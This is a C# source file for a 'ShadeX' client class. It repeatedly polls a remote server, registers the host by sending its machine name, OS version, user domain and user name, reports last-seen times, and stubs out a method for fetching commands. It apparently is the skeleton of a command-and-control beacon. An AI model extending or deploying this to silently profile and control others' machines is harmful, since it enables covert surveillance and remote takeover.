using System;
using System.Net;
using System.Text;
using System.Collections.Specialized;
using System.Threading;

namespace ShadeX_Core
{
    public class ShadeApi
    {
        private string adress;
        public ShadeApi(string adress)
        {
            this.adress = adress;

            /* Connection Handler */
            new Thread(delegate () {
                bool wasConnected = false;
                while(true)
                {
                    if (Request(adress,new NameValueCollection() { { "action","test" } }) == "True")
                    {
                        if(!wasConnected)
                        {
                            GetConnection();
                            wasConnected = true;
                            
                        }
                        Thread.Sleep(10000);
                    }
                    else
                    {
                        if(wasConnected)
                        {
                            LoseConnection();
                            wasConnected = false;
                            
                        }
                        Thread.Sleep(1000);
                    }
                    
                }
            }).Start();
        }

        /*             CONNECTION EVENTS              */
        public delegate void DelegateConnected();
        public event DelegateConnected GetConnection;

        public delegate void DelegateLoseConnection();
        public event DelegateLoseConnection LoseConnection;

        public string GetNextCommand(string device_id)
        {
            return null;        
        }

        /* UPDATE LAST SEEN INFO */
        public bool UpdateOnlineStatusTime(string device_id)
        {
            string res = Request(adress + "/device/", new NameValueCollection() {
                { "action","set_last_seen" },
                { "device_id", device_id },
                { "last_seen", DateTime.Now.ToString() }
            });

            return (res != null) && (res == "True");
        }

        /* CREATING NEW DEVICE */
        public bool CreateNewDevice(string device_id)
        {
            string res = Request(adress + "/device/",new NameValueCollection() {
                { "action","create_new_device"},
                { "device_id", device_id},
                { "machine_name", Environment.MachineName },
                { "os_version", Environment.OSVersion.ToString() },
                { "user_domain_name", Environment.UserDomainName },
                { "user_name", Environment.UserName }
            });

            return (res != null) && (res == "True");
        }

        /* MAKE REQUEST TO HTTP SERVER */
        private string Request(string adress,NameValueCollection args)
        {
            using(WebClient client = new WebClient())
            {
                try
                {
                    byte[] response_ = client.UploadValues(adress,"POST", args);
                    string text_response = Encoding.UTF8.GetString(response_);
                   // Console.WriteLine(text_response);
                    return text_response;
                }
                catch
                {
                    return null;
                }
            }
        }
    }
}
